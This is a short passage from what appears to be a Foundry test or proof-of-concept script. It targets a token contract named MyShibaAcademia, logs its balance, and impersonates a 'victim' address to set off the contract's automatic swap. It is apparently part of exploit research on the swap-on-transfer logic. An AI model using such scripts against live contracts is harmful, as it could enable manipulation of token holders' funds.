        uint256 finalContractBalance = MyShibaAcademia(TARGET).balanceOf(TARGET);
        console.log("Final contract token balance:", finalContractBalance);

        // The swap should trigger automatically when contract balance >= minimumTokensBeforeSwap
        // Let's make one more transfer to ensure it triggers
        if (finalContractBalance >= 100 * 10**9) {
            // Swap should happen on next transfer from non-pair
            vm.prank(victim);
            MyShibaAcademia(TARGET).transfer(address(0x999), 10_000 * 10**9);
